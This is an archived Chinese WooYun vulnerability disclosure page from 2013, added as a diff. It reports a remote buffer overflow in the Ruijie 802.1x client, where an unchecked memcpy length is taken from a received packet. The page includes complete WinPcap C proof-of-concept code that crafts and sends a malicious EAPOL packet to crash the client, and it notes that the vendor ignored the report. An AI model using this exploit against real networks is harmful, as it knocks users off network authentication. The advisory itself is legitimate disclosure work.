@@ -1,0 +1,264 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		锐捷 802.1x客户端远程缓冲区溢出漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		锐捷 802.1x客户端远程缓冲区溢出漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/cssembly">cssembly</a> 
+</li><li>提交时间：		2013-03-11 11:22</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-11：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-06-09：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">锐捷802.1x客户端存在远程缓冲区溢出漏洞，当发送恶意的数据包到客户端，会造成远程缓冲区溢出导致拒绝服务</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">通过查看IDA反汇编结果，可以看到sub_465920函数中<br />
+<br />
+</p><p class="detail"><a href="../images/11111206c751830ca5ec228d84b7d5c9750335d4.png" target="_blank"><img src="../images/11111206c751830ca5ec228d84b7d5c9750335d4.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+memcpy拷贝数据的长度是可控的，由程序接收到的数据包中的第26,27字节决定，而程序并未进行有效的校验，导致缓冲区溢出，造成拒绝服务 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">poc代码：<br />
+<br />
+</p><pre><code>#include &lt;pcap.h&gt;<br />
+<br />
+#pragma comment( lib , &quot;wpcap.lib&quot; )<br />
+<br />
+int _tmain(int argc, _TCHAR* argv[])<br />
+{<br />
+<br />
+	pcap_t *fp;<br />
+	char errbuf[PCAP_ERRBUF_SIZE];<br />
+	u_char packet[3000];<br />
+	pcap_if_t *alldevs;<br />
+<br />
+	/* Check the validity of the command line */<br />
+	if(pcap_findalldevs(&amp;alldevs, errbuf) == -1)<br />
+	{<br />
+		fprintf(stderr,&quot;Error in pcap_findalldevs: %s\n&quot;, errbuf);<br />
+		exit(1);<br />
+	}<br />
+<br />
+	pcap_if_t *d;<br />
+	int i = 0;<br />
+	/* Print the list */<br />
+	for(d=alldevs; d; d=d-&gt;next)<br />
+	{<br />
+		printf(&quot;%d. %s&quot;, ++i, d-&gt;name);<br />
+		if (d-&gt;description)<br />
+			printf(&quot; (%s)\n&quot;, d-&gt;description);<br />
+		else<br />
+			printf(&quot; (No description available)\n&quot;);<br />
+	}<br />
+<br />
+	/* 选择相应网卡*/<br />
+	if ((fp = pcap_open_live(alldevs-&gt;name,		// name of the device<br />
+		65536,			// portion of the packet to capture. It doesn&#039;t matter in this case <br />
+		1,				// promiscuous mode (nonzero means promiscuous)<br />
+		1000,			// read timeout<br />
+		errbuf			// error buffer<br />
+		)) == NULL)<br />
+	{<br />
+		fprintf(stderr,&quot;\nUnable to open the adapter. %s is not supported by WinPcap\n&quot;, argv[1]);<br />
+		return 2;<br />
+	}<br />
+<br />
+	memset( packet , 0 , 1000 );<br />
+	<br />
+	/* 目标机器mac地址 */<br />
+	packet[0]= 0x00;<br />
+	packet[1]= 0x0C;<br />
+	packet[2]= 0x29;<br />
+	packet[3]= 0x0F;<br />
+	packet[4]= 0x63;<br />
+	packet[5]= 0xDD;<br />
+<br />
+	/* set mac source to 2:2:2:2:2:2 */<br />
+	packet[6]= 2;<br />
+	packet[7]= 2;<br />
+	packet[8]= 2;<br />
+	packet[9]= 2;<br />
+	packet[10]= 2;<br />
+	packet[11]= 2;<br />
+<br />
+	/* 协议头 */<br />
+	packet[12] = 0x88;<br />
+	packet[13] = 0x8e;<br />
+	packet[14] = 0x01;<br />
+	packet[15] = 0x00;<br />
+<br />
+	packet[16] = 0xFF;//&gt;4<br />
+	packet[17] = 0xFF;//&gt;4<br />
+	packet[18] = 0x03;<br />
+	<br />
+	packet[22] = 0x00;//<br />
+	packet[23] = 0x00;//<br />
+	packet[24] = 0x13;//<br />
+	packet[25] = 0x11;//<br />
+	packet[26] = 0xEE;//<br />
+	packet[27] = 0xFF;//<br />
+	/* Send down the packet */<br />
+	if (pcap_sendpacket(fp,	// Adapter<br />
+		packet,				// buffer with the packet<br />
+		100	// size<br />
+		) != 0)<br />
+	{<br />
+		fprintf(stderr,&quot;\nError sending the packet: %s\n&quot;, pcap_geterr(fp));<br />
+		return 3;<br />
+	}<br />
+	Sleep( 100 );<br />
+	if (pcap_sendpacket(fp,	// Adapter<br />
+		packet,				// buffer with the packet<br />
+		100					// size<br />
+		) != 0)<br />
+	{<br />
+		fprintf(stderr,&quot;\nError sending the packet: %s\n&quot;, pcap_geterr(fp));<br />
+		return 3;<br />
+	}<br />
+	pcap_close(fp);	<br />
+	return 0;<br />
+}</code></pre><p class='detail'><br />
+<br />
+运行程序<br />
+<br />
+</p><p class="detail"><a href="../images/111117490502846870da989e72d9cb6339fcf192.png" target="_blank"><img src="../images/111117490502846870da989e72d9cb6339fcf192.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+输入用户名和密码点击连接<br />
+<br />
+</p><p class="detail"><a href="../images/111118517d6a19f4071301aa473c1f10dcebc784.png" target="_blank"><img src="../images/111118517d6a19f4071301aa473c1f10dcebc784.png" alt="1.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+运行poc代码<br />
+<br />
+</p><p class="detail"><a href="../images/11111912b46260efebfd69c06d669348c6ad2976.png" target="_blank"><img src="../images/11111912b46260efebfd69c06d669348c6ad2976.png" alt="2.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+客户端程序溢出，并退出 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/cssembly" title="cssembly">cssembly</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-019896" title="锐捷 802.1x客户端远程缓冲区溢出漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="19896";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
